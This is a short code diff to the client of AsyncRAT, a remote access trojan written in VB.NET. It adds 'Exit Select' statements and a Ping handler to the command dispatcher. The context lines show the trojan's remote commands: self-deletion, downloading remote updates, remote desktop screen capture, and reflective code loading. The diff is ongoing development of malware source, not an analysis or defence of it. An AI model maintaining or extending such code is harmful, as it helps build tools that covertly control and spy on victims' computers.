@@ -289,7 +289,6 @@ Namespace AsyncRAT
             Try
                 If isConnected = True Then
                     Send(CByte(PacketHeader.Ping))
-                    Debug.WriteLine("Pinged!")
                 End If
             Catch ex As Exception
             End Try
@@ -311,6 +310,7 @@ Namespace AsyncRAT
                         Catch ex As Exception
                         End Try
                         Environment.Exit(0)
+                        Exit Select
 
                     Case PacketHeader.ClientDelete
                         SelfDelete()
@@ -318,16 +318,24 @@ Namespace AsyncRAT
                     Case PacketHeader.ClientUpdate
                         Program.Send(CByte(PacketHeader.MsgReceived))
                         Download(itm(1), itm(2), itm(3))
+                        Exit Select
 
                     Case PacketHeader.RemoteDesktopOpen
                         Program.Send(CByte(PacketHeader.RemoteDesktopOpen))
+                        Exit Select
 
                     Case PacketHeader.RemoteDesktopSend
                         Capture(itm(1), itm(2))
+                        Exit Select
 
                     Case PacketHeader.Reflection
                         Program.Send(CByte(PacketHeader.MsgReceived))
                         Reflection(itm(1))
+                        Exit Select
+
+                    Case PacketHeader.Ping
+                        Debug.WriteLine("Server just pinged me")
+                        Exit Select
 
                 End Select
 
